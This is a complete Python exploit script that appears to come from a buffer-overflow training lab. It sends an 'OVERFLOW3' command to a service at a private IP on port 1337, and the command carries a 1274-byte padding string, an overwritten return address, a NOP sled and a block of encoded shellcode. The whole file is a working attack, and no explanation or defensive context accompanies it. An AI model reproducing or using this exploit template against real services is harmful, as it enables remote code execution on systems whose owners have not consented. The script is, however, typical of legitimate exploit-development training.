#!/usr/bin/env python3

import socket

ip = "10.10.67.242"
port = 1337

prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
# 62501203
retn = "\x03\x12\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\x7c\x5b\xf6\x35\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x80\xb3\x74\x35\x78"
"\x44\x19\xbf\x9d\x75\x19\xdb\xd6\x26\xa9\xaf\xba\xca\x42\xfd"
"\x2e\x58\x26\x2a\x41\xe9\x8d\x0c\x6c\xea\xbe\x6d\xef\x68\xbd"
"\xa1\xcf\x51\x0e\xb4\x0e\x95\x73\x35\x42\x4e\xff\xe8\x72\xfb"
"\xb5\x30\xf9\xb7\x58\x31\x1e\x0f\x5a\x10\xb1\x1b\x05\xb2\x30"
"\xcf\x3d\xfb\x2a\x0c\x7b\xb5\xc1\xe6\xf7\x44\x03\x37\xf7\xeb"
"\x6a\xf7\x0a\xf5\xab\x30\xf5\x80\xc5\x42\x88\x92\x12\x38\x56"
"\x16\x80\x9a\x1d\x80\x6c\x1a\xf1\x57\xe7\x10\xbe\x1c\xaf\x34"
"\x41\xf0\xc4\x41\xca\xf7\x0a\xc0\x88\xd3\x8e\x88\x4b\x7d\x97"
"\x74\x3d\x82\xc7\xd6\xe2\x26\x8c\xfb\xf7\x5a\xcf\x93\x34\x57"
"\xef\x63\x53\xe0\x9c\x51\xfc\x5a\x0a\xda\x75\x45\xcd\x1d\xac"
"\x31\x41\xe0\x4f\x42\x48\x27\x1b\x12\xe2\x8e\x24\xf9\xf2\x2f"
"\xf1\xae\xa2\x9f\xaa\x0e\x12\x60\x1b\xe7\x78\x6f\x44\x17\x83"
"\xa5\xed\xb2\x7e\x2e\x18\x4e\x99\x5c\x74\x52\x99\xb1\xd9\xdb"
"\x7f\xdb\xf1\x8d\x28\x74\x6b\x94\xa2\xe5\x74\x02\xcf\x26\xfe"
"\xa1\x30\xe8\xf7\xcc\x22\x9d\xf7\x9a\x18\x08\x07\x31\x34\xd6"
"\x9a\xde\xc4\x91\x86\x48\x93\xf6\x79\x81\x71\xeb\x20\x3b\x67"
"\xf6\xb5\x04\x23\x2d\x06\x8a\xaa\xa0\x32\xa8\xbc\x7c\xba\xf4"
"\xe8\xd0\xed\xa2\x46\x97\x47\x05\x30\x41\x3b\xcf\xd4\x14\x77"
"\xd0\xa2\x18\x52\xa6\x4a\xa8\x0b\xff\x75\x05\xdc\xf7\x0e\x7b"
"\x7c\xf7\xc5\x3f\x9c\x1a\xcf\x35\x35\x83\x9a\xf7\x58\x34\x71"
"\x3b\x65\xb7\x73\xc4\x92\xa7\xf6\xc1\xdf\x6f\xeb\xbb\x70\x1a"
"\x0b\x6f\x70\x0f\x0b\x8f\x8e\xb0")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")